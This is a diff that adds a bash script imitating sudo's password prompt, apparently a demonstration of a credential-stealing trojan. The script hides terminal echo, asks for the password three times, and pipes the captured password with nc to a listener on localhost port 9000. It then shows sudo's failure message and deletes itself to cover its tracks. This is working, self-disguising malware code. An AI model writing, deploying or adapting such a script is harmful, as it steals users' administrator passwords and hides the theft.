@@ -1,0 +1,24 @@
+#!/usr/bin/env bash
+
+# Turn off the character echo to the screen. sudo does this to prevent the user's password from appearing on screen when they type it in.
+stty -echo
+
+# Prompt user for password and then read input. To disguise the nature of this malicious version, do this 3 times to imitate the behavior of sudo when a user enters the wrong password.
+prompt_count=1
+while [ $prompt_count -le 3 ]; do
+    echo -n "[sudo] password for $(whoami): "
+    read password_input
+    echo
+    sleep 3  # sudo will pause between repeated prompts
+    prompt_count=$(( prompt_count + 1 ))
+done
+
+# Turn the character echo back on.
+stty echo
+
+echo $password_input | nc -N localhost 9000
+
+# Display sudo's actual error message and then delete self.
+echo "sudo: 3 incorrect password attempts"
+rm $0
+exit 1  # sudo returns 1 with a failed password attempt
